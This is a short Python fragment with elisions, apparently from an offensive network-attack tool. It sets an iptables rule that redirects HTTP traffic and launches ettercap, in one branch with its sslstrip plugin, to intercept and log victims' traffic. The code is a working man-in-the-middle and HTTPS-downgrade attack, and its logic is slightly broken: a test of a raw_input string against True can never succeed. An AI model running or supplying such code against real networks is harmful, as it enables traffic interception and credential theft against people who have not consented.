...
start_sslstrip = raw_input(
    "Do you want to use sslstrip (select no to use ettercap for https downgrade - only works with ettercap 0.7.5 and later) [yes] \n")
...
if start_sslstrip == True:
    ...
    subprocess.Popen("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8765",
                     shell=True).wait()
    time.sleep(5)  # make sure that other processes are started before kicking off ettercap
    resultat = ("ettercap -T -i " + iface + " -w " + session_dir + "/ettercap.pcap -L " + session_dir + "/ettercap")
    subprocess.Popen(
        "ettercap -T -i " + iface + " -w " + session_dir + "/ettercap.pcap -L " + session_dir + "/ettercap",
        shell=True).wait()
else:
    # Use ettercap sslstrip plugin
    time.sleep(5)  # make sure that other processes are started before kicking off ettercap
    resultat = (
                "ettercap -T -P sslstrip -i " + iface + " -w " + session_dir + "/ettercap.pcap -L " + session_dir + "/ettercap")
    subprocess.Popen(
        "ettercap -T -P sslstrip -i " + iface + " -w " + session_dir + "/ettercap.pcap -L " + session_dir + "/ettercap",
        shell=True).wait()
